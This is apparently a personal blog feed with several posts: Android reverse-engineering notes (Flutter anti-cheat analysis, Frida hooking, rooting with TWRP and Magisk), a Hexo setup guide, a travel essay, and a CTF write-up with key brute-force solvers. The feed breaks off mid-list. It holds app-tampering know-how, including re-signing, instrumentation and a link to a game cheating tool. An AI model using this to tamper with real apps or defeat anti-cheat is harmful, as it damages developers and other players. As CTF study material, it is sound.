<h6 id="9-14-BabyAnti2完整复现："><a href="#9-14-BabyAnti2完整复现：" class="headerlink" title="9.14: BabyAnti2完整复现："></a>9.14: BabyAnti2完整复现：</h6><p>AntiCheatPlugin的Java层几乎看不到东西，只能判断使用flutter，那么必须继续看下去，找dart层和native层的逻辑</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914083329468.png" alt="image-20230914083329468"></p>
<p>直接看native：</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914083721077.png" alt="image-20230914083721077"></p>
<p><code>libflutter.so</code>：flutter预编译的组件库（不会因为开发者的Dart而改变），flutter引擎的主要组成部分，包含了flutter运行所需要的核心代码，负责渲染Flutter widgets、处理事件、与Dart VM进行交互以及其他核心功能</p>
<p><code>libapp.so</code>：Dart代码编译后的产物，包含所有Dart层的native逻辑、UI、Flutter plugins，当应用启动时，<code>libflutter.so</code>会加载<code>libapp.so</code>并开始执行Dart代码</p>
<p><code>libanticheat.so（其他）</code>：通过Android NDK编写的native代码编译产物</p>
<p>尝试通过<a href="https://github.com/rscloura/Doldrums">rscloura&#x2F;Doldrums: A Flutter&#x2F;Dart reverse engineering tool (github.com)</a>工具提取libapp.so，失败，DartSDK版本对不上</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914094329393.png" alt="image-20230914094329393"></p>
<p>寻找版本相关信息，可以得到这段，获取版本号3.1.0（这里可以猜测这个是dart的版本）对应到<a href="https://docs.flutter.dev/release/archive?tab=windows">Flutter SDK archive | Flutter</a>可以查找flutter的版本号beta版本的3.13.0-0.4.pre（根据发布时间和Dart version，不过hash号没有找到，还得看看）</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914103350070.png" alt="image-20230914103350070"></p>
<p>题目出的时候<code>reflutter</code>还没有更新到这个版本，可以认为，在比赛环境下这让做这道题的预期解难度陡然升高</p>
<p>那也只能开始漫长学习，先看看这篇的原理：<a href="https://swarm.ptsecurity.com/fork-bomb-for-flutter/">Fork Bomb for Flutter – PT SWARM (ptsecurity.com)</a></p>
<p>安装应用：<code>adb push .apk /data/local/tmp </code></p>
<p><code>pm install -r .apk</code></p>
<p>签名工具：<a href="https://github.com/patrickfav/uber-apk-signer/releases/tag/v1.2.1">Release v1.2.1 · patrickfav&#x2F;uber-apk-signer (github.com)</a></p>
<p><code>java -jar uber-apk-signer.jar --allowResign -**a** release.RE.apk</code></p>
<p><code> adb logcat -e reflutter | ForEach-Object &#123; $_ -replace &#39;.*DartVM&#39;, &#39;&#39; &#125; &gt;&gt; reflutter.txt</code></p>
]]></content>
  </entry>
  <entry>
    <title>to build your blog on github</title>
    <url>/2022/08/26/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Build-Blog-with-Hexo-and-GitHub-Pages"><a href="#Build-Blog-with-Hexo-and-GitHub-Pages" class="headerlink" title="Build Blog with Hexo and GitHub Pages"></a>Build Blog with Hexo and GitHub Pages</h1><h5 id="Published-2022-x2F-08-x2F-26"><a href="#Published-2022-x2F-08-x2F-26" class="headerlink" title="Published: 2022&#x2F;08&#x2F;26"></a>Published: 2022&#x2F;08&#x2F;26</h5><h5 id="Updated-2022-x2F-08-x2F-26"><a href="#Updated-2022-x2F-08-x2F-26" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;26"></a>Updated: 2022&#x2F;08&#x2F;26</h5><h2 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h2><h6 id="As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog"><a href="#As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog" class="headerlink" title="As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog."></a>As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog.</h6><h6 id="THE-THINGS-NEED-TO-BE-DONE"><a href="#THE-THINGS-NEED-TO-BE-DONE" class="headerlink" title="THE THINGS NEED TO BE DONE"></a>THE THINGS NEED TO BE DONE</h6><span id="more"></span>
<hr>
<blockquote>
<p>hexo</p>
<blockquote>
<p>Hexo is a blog framework based on Node.js. We can maintain a Hexo instance on local machine, and publish it to Github pages.</p>
</blockquote>
</blockquote>
<blockquote>
<p>node.js</p>
<blockquote>
<p>an free open source server environment which can be ran on Windows, Linux, Unix, Mac OS X, ect.</p>
</blockquote>
</blockquote>
<blockquote>
<p>set up the github account</p>
<blockquote>
<p>GitHub Pages is a static site hosting service designed to host your personal, organization or project pages directly from a GitHub repository</p>
</blockquote>
</blockquote>
<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p>Go to <a href="https://nodejs.org/en/download/">Download - Node.js</a>, choose and install the right version for your computer.</p>
<p>Run <code>node -v</code> then <code>npm -v</code> on cmd, check your Node.js version if it doesn’t output two version of node and npm.</p>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>Go to <a href="https://git-scm.com/downloads">Download - git</a>, leave the options default if you don’t understand.</p>
<p>When you are done, use cmd to chack if you do it right by run</p>
<blockquote>
<p><code>git --version</code><br>If it outputs your git version, you do it right.</p>
</blockquote>
<p>run</p>
<p><code>git config --global user.name &quot;Your Name&quot;</code><br><code>git config --global user.email youremail@example.com</code><br><code> ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p>
<p>and you will get two files(your own screen name and your email)</p>
<h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>Run <code>npm install hexo-cli -g</code> on a folder you would like to</p>
<p>Run <code>hexo init</code> and <code>npm install</code> on THE FOLDER YOU WANT TO PUT YOUR BLOG IN, run <code>hexo version</code>(<code>hexo -v</code>) to verify Hexo.</p>
<p>run <code>hexo g</code> then <code>hexo s</code> <code>(hexo server)</code> and visit <a href="http://localhost:4000/">your blog</a> (<a href="http://localhost:4000/">http://localhost:4000</a>, the default port is 4000, if it reports error, try to run <code>hexo s -i</code>, i stands for the port that isn’t occupied)</p>
<p>find <code>_config.yml</code>, find <code>deploy:</code>,part and edit:</p>
<p><code>deploy:</code><br><code>type: git</code><br><code>repo: git@github.com:yourname/yourname.github.io.git</code><br><code>branch: master</code></p>
<p>Create a GitHub Repository</p>
<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS:"></a>TIPS:</h4><p>Change your GitHub Branch from “main” to “Master”</p>
<p>Find a file end with “id_rsa.pub” which generated when you install git and get the ssh key above. Copy it and paste it into your GitHub Repository ssh key</p>
<p>run <code>npm install hexo-deployer-git --save</code></p>
<p>Now, run <code>hexo d -g</code> and visit your GitHub wesite (which you can find in your repository SETTING), you should see your blog above. </p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>hexo</tag>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>夜彳亍</title>
    <url>/2023/03/17/%E5%A4%9C%E5%BD%B3%E4%BA%8D/</url>
    <content><![CDATA[<h4 id="夜彳亍京城"><a href="#夜彳亍京城" class="headerlink" title="夜彳亍京城"></a>夜彳亍京城</h4><h6 id="题目来源于AiDai学长、bridge和nova等"><a href="#题目来源于AiDai学长、bridge和nova等" class="headerlink" title="题目来源于AiDai学长、bridge和nova等"></a>题目来源于AiDai学长、bridge和nova等</h6><h6 id="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"><a href="#长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师" class="headerlink" title="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"></a>长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师</h6><span id="more"></span>
<ul>
<li><a href="#1">夜彳亍</a></li>
<li><a href="#2">回程</a></li>
</ul>
<h4 id="夜彳亍"><a href="#夜彳亍" class="headerlink" title="夜彳亍"></a><div id="1">夜彳亍<div></div></div></h4><p>倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。</p>
<p>这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。</p>
<p>这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。</p>
<p>但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。</p>
<p>这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。</p>
<p>这个点的车水马龙，并不是什么繁华的象征。</p>
<p>这意味着这条路是背离市中心的，向着居民区延伸的。</p>
<p>也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。</p>
<p>一路走下去，没什么特别的。</p>
<p>就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。</p>
<p>就只是车越来越少，人行道上也看不见什么人了。</p>
<p>那看看手机地图吧。</p>
<p>路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。</p>
<p>我原以为我一直在走大道。但实际上似乎还是走到小道里了。</p>
<p>看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。</p>
<p>不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。</p>
<p>那就回来吧，其实也挺无聊的。</p>
<p>一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。</p>
<p>来的时候，右边看到一个卖馒头的。</p>
<p>看不清，似乎没人，看到了微信收款码。</p>
<p>还听到（或许是看到呢）一清二楚的大馒头一块钱一个。</p>
<p>来的时候，就在最后一个十字路口，有一个老太在卖玉米。</p>
<p>烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。</p>
<p>她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。</p>
<p>总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。</p>
<p>提着菜的，忙碌的人比来时的路少了。</p>
<p>回到十字路口。茫然发现，其实过来这条路并不长。</p>
<p>确实，回头看的时候总觉得，其实确实不是一条有多长的路。</p>
<p>但反正，还有时间，那在地铁入口的路口，往右拐看看。</p>
<p>但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。</p>
<p>一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。</p>
<p>也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。</p>
<h4 id="·-回程"><a href="#·-回程" class="headerlink" title="· 回程"></a><div id="2">· 回程<div></div></div></h4><p>总归是一会就回来了，什么也没发生。本来也不期待什么会发生。</p>
<p>但也还算发生了点什么，算是给点时间。</p>
<p>回来看这群打ctf的好像也没聊啥，那倒没错过啥。</p>
<p>虽然水群太多是该戒戒就是。</p>
<p>倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。</p>
<h6 id="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"><a href="#感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。" class="headerlink" title="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"></a>感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。</h6><h6 id="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"><a href="#没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。" class="headerlink" title="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"></a>没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。</h6>]]></content>
  </entry>
  <entry>
    <title>安卓hook初探</title>
    <url>/2023/08/28/%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便"><a href="#preface-隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便" class="headerlink" title="preface: 隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便."></a>preface: 隐约记得之前弄过一次，但是这次换了个环境折腾了一整天吧还挺麻烦的，总之记录一下后面搞起来方便.</h6><span id="more"></span>

<hr>
<h5 id="环境：mumu12模拟器"><a href="#环境：mumu12模拟器" class="headerlink" title="环境：mumu12模拟器"></a>环境：mumu12模拟器</h5><h6 id="adb连接："><a href="#adb连接：" class="headerlink" title="adb连接："></a>adb连接：</h6><p><img src="/2023/08/28/%E5%AE%89%E5%8D%93hook%E5%88%9D%E6%8E%A2/image-20230828105143258.png" alt="image-20230828105143258"></p>
<h5 id="连接：adb-exe-connect-127-0-0-1-断开：adb-exe-disconnect-127-0-0-1"><a href="#连接：adb-exe-connect-127-0-0-1-断开：adb-exe-disconnect-127-0-0-1" class="headerlink" title="连接：adb.exe connect 127.0.0.1:*****  断开：adb.exe disconnect 127.0.0.1:*****"></a>连接：<code>adb.exe connect 127.0.0.1:*****</code>  断开：<code>adb.exe disconnect 127.0.0.1:*****</code></h5><h5 id="检查设备：adb-exe-devices"><a href="#检查设备：adb-exe-devices" class="headerlink" title="检查设备：adb.exe devices"></a>检查设备：<code>adb.exe devices</code></h5><h5 id="shell-adb-s-127-0-0-1-shell-或-adb-shell"><a href="#shell-adb-s-127-0-0-1-shell-或-adb-shell" class="headerlink" title="shell: adb -s 127.0.0.1:***** shell 或 adb shell"></a>shell: <code>adb -s 127.0.0.1:***** shell</code> 或 <code>adb shell</code></h5><hr>
<h5 id="查看手机CPU架构-：-getprop-ro-product-cpu-abi"><a href="#查看手机CPU架构-：-getprop-ro-product-cpu-abi" class="headerlink" title="查看手机CPU架构 ： getprop ro.product.cpu.abi"></a>查看手机CPU架构 ： <code>getprop ro.product.cpu.abi</code></h5><h5 id="找到对应frida-server：-frida-version检查本机frida版本Releases-·-frida-x2F-frida-github-com"><a href="#找到对应frida-server：-frida-version检查本机frida版本Releases-·-frida-x2F-frida-github-com" class="headerlink" title="找到对应frida server： frida version检查本机frida版本Releases · frida&#x2F;frida (github.com)"></a>找到对应frida server： <code>frida version</code>检查本机frida版本<a href="https://github.com/frida/frida/releases">Releases · frida&#x2F;frida (github.com)</a></h5><h5 id="运行frida-server-adb-push-frida-server-data-local-tmp"><a href="#运行frida-server-adb-push-frida-server-data-local-tmp" class="headerlink" title="运行frida server: adb push frida-server /data/local/tmp/"></a>运行frida server: <code>adb push frida-server /data/local/tmp/</code></h5><h5 id="cd-data-local-tmp"><a href="#cd-data-local-tmp" class="headerlink" title="cd /data/local/tmp"></a><code>cd /data/local/tmp</code></h5><h5 id="frida-server"><a href="#frida-server" class="headerlink" title="./frida-server"></a><code>./frida-server</code></h5><h5 id="电脑查看手机正在运行的进程：firda-ps-U"><a href="#电脑查看手机正在运行的进程：firda-ps-U" class="headerlink" title="电脑查看手机正在运行的进程：firda-ps -U"></a>电脑查看手机正在运行的进程：<code>firda-ps -U</code></h5><h5 id="端口转发-adb-forward-tcp-27042-tcp-27042"><a href="#端口转发-adb-forward-tcp-27042-tcp-27042" class="headerlink" title="端口转发: adb forward tcp:27042 tcp:27042"></a>端口转发: <code>adb forward tcp:27042 tcp:27042</code></h5><h5 id="查看包名："><a href="#查看包名：" class="headerlink" title="查看包名："></a>查看包名：</h5><pre><code class="text">#查看进程中的信息
#process = frida.get_usb_device().enumerate_processes()
#print(process)

1.新开一个shell输入命令：
adb shell am monitor
2.启动需要获取包名的应用
</code></pre>
<hr>
<h5 id="运行frida脚本-frida-U-l-your-script-js-f-com-yourapp-package"><a href="#运行frida脚本-frida-U-l-your-script-js-f-com-yourapp-package" class="headerlink" title="运行frida脚本:frida -U -l your-script.js -f com.yourapp.package"></a>运行frida脚本:<code>frida -U -l your-script.js -f com.yourapp.package</code></h5><h5 id="frida检查包名：adb-shell-pm-list-packages-grep"><a href="#frida检查包名：adb-shell-pm-list-packages-grep" class="headerlink" title="frida检查包名：adb shell pm list packages | grep ***"></a>frida检查包名：<code>adb shell pm list packages | grep ***</code></h5><hr>
<h5 id="gg修改器-https-gameguardian-net-forum-files-file-2-gameguardian"><a href="#gg修改器-https-gameguardian-net-forum-files-file-2-gameguardian" class="headerlink" title="gg修改器:    https://gameguardian.net/forum/files/file/2-gameguardian/"></a>gg修改器:    <a href="https://gameguardian.net/forum/files/file/2-gameguardian/">https://gameguardian.net/forum/files/file/2-gameguardian/</a></h5>]]></content>
  </entry>
  <entry>
    <title>安卓调试初探</title>
    <url>/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"><a href="#preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识" class="headerlink" title="preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识"></a>preface：说是初探，也不是很初探吧其实，前面多多少少弄过完整的流程了，但是由于hyperV这玄学东西后面搞的环境一团糟，打算还是重新弄一个完整的调试方案出来，顺便记录一些基础知识</h6><span id="more"></span>

<h6 id="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"><a href="#初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突" class="headerlink" title="初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突"></a>初学配安卓环境挺痛苦的，有几大原因：还没准备可以root的真机；在x86架构下跑arm的方案很少，流畅的更少；能比较流畅运行的大多是商业模拟器，但是我的本地linux环境大多放在wsl2上，商业模拟器很多与wsl2的hyperV冲突</h6><h5 id="几个尝试过或可以考虑的方案："><a href="#几个尝试过或可以考虑的方案：" class="headerlink" title="几个尝试过或可以考虑的方案："></a>几个尝试过<del>或可以考虑</del>的方案：</h5><table>
<thead>
<tr>
<th align="center">Android Studio</th>
<th align="center">mumu12</th>
<th align="center">qemu</th>
<th align="center">真机</th>
</tr>
</thead>
<tbody><tr>
<td align="center">选择多</td>
<td align="center">使用方便</td>
<td align="center">配置麻烦</td>
<td align="center"><del>准备尝试</del>已配置，需要root，略麻烦</td>
</tr>
</tbody></table>
<h5 id="1、Android-Studio"><a href="#1、Android-Studio" class="headerlink" title="1、Android Studio"></a>1、Android Studio</h5><p>在so有x86支持时为比较优解，可以随意选择安卓版本来使用。仅支持arm时本机能成功运行的镜像仅有：<img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230811134825647.png" alt="image-20230811134825647">armeabi-v7a的Nougat，但很多新的apk都是arm64-v8a，这里本机跑会报很多错，而且很慢很慢</p>
<p>2、正常情况下可以用nox或者雷电模拟器，稳定性还行，但是有wsl2的情况下会出奇怪问题（雷电号称是有兼容的，但是实测用起来会卡死，懒得修了直接换个）之前一直用的mumux，但是这两天连adb会触发强制更新，换成mumu12居然还可以用，属于比较惊喜的，在真机拿到前可以先用这个方案</p>
<p>mumu12用的x86的架构，但是实测是可以跑arm64-v8a的，具体原理不太懂，但是确实挺好用的，可以按照这篇操作，调试so层</p>
<p><a href="https://www.cnblogs.com/ddms/p/8820044.html">IDA远程调试Android中so文件 - jKing777 - 博客园 (cnblogs.com)</a></p>
<h5 id="3、qemu"><a href="#3、qemu" class="headerlink" title="3、qemu"></a>3、qemu</h5><p>搭建很麻烦，需要配置可视化，非常麻烦。</p>
<h5 id="4、真机"><a href="#4、真机" class="headerlink" title="4、真机"></a>4、真机</h5><p>理论上的最优解，但是不知道比起商业模拟器优多少呢</p>
<hr>
<h6 id="群开发高手那里收了个二手红米，还得是小米"><a href="#群开发高手那里收了个二手红米，还得是小米" class="headerlink" title="群开发高手那里收了个二手红米，还得是小米"></a><del>群开发高手那里收了个二手红米，还得是小米</del></h6><p>简单记录一下：</p>
<ul>
<li><p>收的手机是已经解了bl锁的，可以暂时跳过这一步（<a href="http://www.romleyuan.com/lec/read?id=83">小米手机官方解锁BootLoader图文教程-适用于全部机型20210925更新-ROM乐园官网 (romleyuan.com)</a>）</p>
<ul>
<li><p>”我的设备“ -&gt; “全部参数” -&gt; 连续点击“MIUI版本”进入开发者模式 -&gt; 在开发者模式中打开adb调试等选项</p>
</li>
<li><p><code>adb devices</code> 检查设备</p>
</li>
<li><p><code>adb shell</code>进入</p>
</li>
</ul>
</li>
<li><p>刷入TWRP进行root（刷失败了就下音量+电源键重新进入FASTBOOT，每次需要重新刷入）</p>
<ul>
<li><code>adb reboot bootloader</code>转为FASTBOOT模式（<a href="https://www.hardreset.info/zh/devices/xiaomi/xiaomi-redmi-note-8-pro/faq/drivers/drivers-xiaomi/">windows 缺少驱动在这里下载</a>）</li>
<li><code>fastboot devices</code>看到设备</li>
<li><code>fastboot flash recovery D:\android\BRP3.5.2v3.1-Red-twrp\recovery.img</code>刷入TWRP（[<a href="https://forum.xda-developers.com/t/recovery-unofficial-begonia-recovery-project-themed-twrp-3-5-0-v2-unified-begonia-begoniain.4242717/">RECOVERY][UNOFFICIAL] Begonia Recovery Project Themed TWRP 3.5.0 V2 UNIFIED [begonia&#x2F;begoniain] | XDA Forums (xda-developers.com)</a>）</li>
<li><code>fastboot flash recover</code>启动TWRP（选择系统重启可以回到系统）</li>
</ul>
</li>
<li><p>刷入Magisk（<code>adb push D:\android\Magisk\Magisk.v26.3.zip /sdcard/</code>）</p>
<ul>
<li><p>在手机上根据提示操作，adb上<code>su</code>即可获得root</p>
<h5 id="大功告成！"><a href="#大功告成！" class="headerlink" title="大功告成！"></a>大功告成！</h5><p><img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230913202333767.png" alt="image-20230913202333767"></p>
</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>羊城杯2023</title>
    <url>/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/</url>
    <content><![CDATA[<h6 id="preface-尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现"><a href="#preface-尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现" class="headerlink" title="preface: 尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现"></a>preface: 尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现</h6><span id="more"></span>

<h3 id="Ez加密器"><a href="#Ez加密器" class="headerlink" title="Ez加密器"></a>Ez加密器</h3><p>调一下发现输入六位秘钥（注意是全数字），base64变表成八位做DES秘钥<br>爆破六位即可</p>
<pre><code class="python">from Crypto.Cipher import DES
import string
import itertools
import base64

def des_decrypt(key, ciphertext):
    cipher = DES.new(key, DES.MODE_ECB)
    return cipher.decrypt(ciphertext)

def custom_base64_encode(s, custom_table):
    std_base64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
    encoded = base64.b64encode(s).decode()
    custom_encoded = &quot;&quot;.join([custom_table[std_base64_table.index(c)] for c in encoded])
    return custom_encoded[:8]

def main():
    ciphertext = bytes.fromhex(&quot;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&quot;)
    charset = string.digits + &quot; &quot;
    print()
    with open(&#39;output.txt&#39;, &#39;w&#39;) as f:
        for combo in itertools.product(charset, repeat=6):
            plaintext = &#39;&#39;.join(combo)
            key = custom_base64_encode(plaintext.encode(), &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;)

            decrypted = des_decrypt(key.encode(), ciphertext)

            if all(32 &lt;= b &lt; 127 for b in decrypted):
                print(f&quot;Possible match: &#123;decrypted.decode(&#39;ascii&#39;)&#125;&quot;)
                print(f&quot;Key: &#123;key&#125;&quot;)
            f.write(str(decrypted) + &#39;\n&#39;)
            f.write(str(key)) #file中搜字符串即可
    # if decrypted.startswith(b&quot;flag&quot;) or decrypted.startswith(&quot;DASC&quot;):
    #     print(f&quot;Possible match: &#123;decrypted_text&#125;&quot;)
        # print(f&quot;Key: &#123;key&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()

</code></pre>
<h3 id="Blast"><a href="#Blast" class="headerlink" title="Blast"></a>Blast</h3><p>比较像Bogus Control Flow，网上脚本去不太干净，把jump $5给nop掉之类的手动修修可以angr脚本恢复main，程序有md5的特征，动调发现比对的地方是flag输入的每一位的md5(md5())，写脚本map一下就行</p>
<pre><code class="python">import hashlib


def generate_md5(text):
    m = hashlib.md5()
    m.update(text.encode(&#39;utf-8&#39;))
    return m.hexdigest()


def generate_table():
    char_to_md5 = &#123;&#125;

    for i in range(32, 127):
        char = chr(i)
        md5_hash = generate_md5(generate_md5(char))
        char_to_md5[char] = md5_hash

    return char_to_md5


def main():
    char_to_md5 = generate_table()

    # print(&quot;Character | Double MD5 Hash&quot;)
    # print(&quot;---------------------------&quot;)
    # for char, md5_hash in char_to_md5.items():
    #     print(f&quot;&#123;repr(char)&#125;      | &#123;md5_hash&#125;&quot;)

    a = [&#39;14d89c38cd0fb23a14be2798d449c182&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;297e7ca127d2eef674c119331fe30dff&#39;,
        &#39;b5d2099e49bdb07b8176dff5e23b3c14&#39;,
        &#39;83be264eb452fcf0a1c322f2c7cbf987&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;71b0438bf46aa26928c7f5a371d619e1&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;ac49073a7165f41c57eb2c1806a7092e&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;ed108f6919ebadc8e809f8b86ef40b05&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;65c162f7c43612ba1bdf4d0f2912bbc0&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;557460d317ae874c924e9be336a83cbe&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;9203d8a26e241e63e4b35b3527440998&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;f91b2663febba8a884487f7de5e1d249&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;d7afde3e7059cd0a0fe09eec4b0008cd&#39;,
        &#39;488c428cd4a8d916deee7c1613c8b2fd&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
